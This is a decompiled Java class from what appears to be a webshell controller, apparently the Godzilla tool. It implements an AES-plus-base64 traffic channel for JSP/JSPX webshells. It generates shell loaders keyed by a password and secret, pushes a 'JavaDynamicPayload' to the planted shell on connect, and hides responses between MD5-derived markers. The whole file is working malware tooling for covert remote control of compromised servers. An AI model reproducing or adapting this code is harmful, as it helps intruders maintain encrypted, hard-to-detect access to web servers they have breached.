//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package shells.cryptions.JavaAes;

import core.annotation.CryptionAnnotation;
import core.annotation.PropertyAnnotation;
import core.imp.Cryption;
import core.shell.ShellEntity;
import java.io.ByteArrayOutputStream;
import java.net.URLEncoder;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import shells.channel.HttpRequestChannel;
import shells.channel.RequestChannel;
import util.Log;
import util.functions;

@CryptionAnnotation(
    Name = "JAVA_AES_BASE64",
    payloadName = "JavaDynamicPayload"
)
public class JavaAesBase64 implements Cryption {
    private ShellEntity shell;
    private RequestChannel request;
    private Cipher decodeCipher;
    private Cipher encodeCipher;
    private String key;
    private boolean state;
    private byte[] payload;
    private byte[] findStrLeft;
    private String pass;
    private byte[] findStrRight;
    @PropertyAnnotation(
        Name = "suffix",
        Value = "jsp;jspx;"
    )
    private String suffix;

    public JavaAesBase64() {
    }

    public void init(ShellEntity context) {
        this.shell = context;
        this.request = new HttpRequestChannel(context);
        context.setRequest(this.request);
        this.key = this.shell.getSecretKeyX();
        this.pass = this.shell.getPassword();
        String findStrMd5 = functions.md5(this.pass + this.key);
        this.findStrLeft = findStrMd5.substring(0, 16).toUpperCase().getBytes();
        this.findStrRight = findStrMd5.substring(16).toUpperCase().getBytes();
        this.shell.putHeader("Content-Type", "application/x-www-form-urlencoded");

        try {
            this.encodeCipher = Cipher.getInstance("AES");
            this.decodeCipher = Cipher.getInstance("AES");
            this.encodeCipher.init(1, new SecretKeySpec(this.key.getBytes(), "AES"));
            this.decodeCipher.init(2, new SecretKeySpec(this.key.getBytes(), "AES"));
            this.payload = this.shell.getPayloadModule().getPayload();
            if (this.payload != null) {
                this.request.sendRequest(this.payload);
                this.state = true;
            } else {
                Log.error("payload Is Null");
            }

        } catch (Exception var4) {
            Log.error(var4);
        }
    }

    public synchronized byte[] encode(byte[] data) {
        try {
            return (this.pass + "=" + URLEncoder.encode(functions.base64EncodeToString(this.encodeCipher.doFinal(data)))).getBytes();
        } catch (Exception var3) {
            Log.error(var3);
            return null;
        }
    }

    public synchronized byte[] decode(byte[] data) {
        try {
            data = functions.base64Decode(this.findStr(data));
            return this.decodeCipher.doFinal(data);
        } catch (Exception var3) {
            Log.error(var3);
            return null;
        }
    }

    public byte[] findStr(byte[] respResult) {
        byte[] content = functions.subMiddleBytes(respResult, this.findStrLeft, this.findStrRight);
        if (content == null) {
            return null;
        } else {
            ByteArrayOutputStream baos = new ByteArrayOutputStream(content.length);

            for(int i = 0; i < content.length; ++i) {
                byte b = content[i];
                if (b != 10 && b != 13) {
                    baos.write(b);
                }
            }

            return baos.toByteArray();
        }
    }

    public boolean isSendRLData() {
        return true;
    }

    public boolean check() {
        return this.state;
    }

    public String getSuffix() {
        return this.suffix;
    }

    public byte[] generate(String password, String secretKey) {
        return Generate.GenerateShellLoder(this.suffix, password, functions.md5(secretKey).substring(0, 16), "base64");
    }
}
